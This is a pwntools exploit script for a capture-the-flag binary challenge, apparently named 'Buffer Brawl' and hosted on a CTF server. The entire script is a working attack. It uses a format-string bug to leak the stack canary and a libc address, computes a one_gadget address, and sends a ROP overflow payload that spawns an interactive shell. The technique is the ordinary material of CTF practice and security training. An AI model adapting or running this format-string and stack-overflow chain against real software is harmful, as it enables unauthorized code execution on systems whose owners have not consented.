#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

#b *stack_check_up+137
gs = '''
b main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("buffer-brawl.chal.wwctf.com", 1337)
    else:
        return process(elf.path)

# Plan:

# Addresses
offset_can = 24
libc_start_main_109 = 0x2d4ed
one_offset = 0xda7c1
pop_r12_pop_r13_ret = 0x9e2ef

# Functions
def uppercut():
    print(io.sendlineafter(b"> ",b"3"))


io = start()

io.sendlineafter(b"> ", b"4") # slip
io.sendlineafter(b"Right or left?", b"%11$llx")
io.recvline()
canary = int(io.recvline().strip(), 16)
log.info("Canary: %s" % hex(canary))

io.sendlineafter(b"> ", b"4") # slip
io.sendlineafter(b"Right or left?", b"%11$llx")
io.recvline()
canary1 = int(io.recvline().strip(), 16)
log.info("Canary: %s" % hex(canary1))

io.sendlineafter(b"> ", b"4") # slip
io.sendlineafter(b"Right or left?", b"%29$llx")
io.recvline()
libc_leak = io.recvline().strip()
libc_leak = int(libc_leak, 16)
log.info("Libc leak: %s" % hex(libc_leak))

log.info("_libc_star_main : %s " % hex(libc_leak-0x6d))

libc_base = libc_leak - libc_start_main_109
log.info("Libc base: %s" % hex(libc_base))

one_gadget = libc_base + one_offset
log.info("Onegadget: %s" % hex(one_gadget))


payload = p64(0)*3 + p64(canary) + b"B"*8 + p64(libc_base + pop_r12_pop_r13_ret) + p64(0) + p64(0) + p64(one_gadget)


for i in range(29):
    uppercut()

print(io.sendlineafter(b"Enter your move:", payload))


io.interactive()
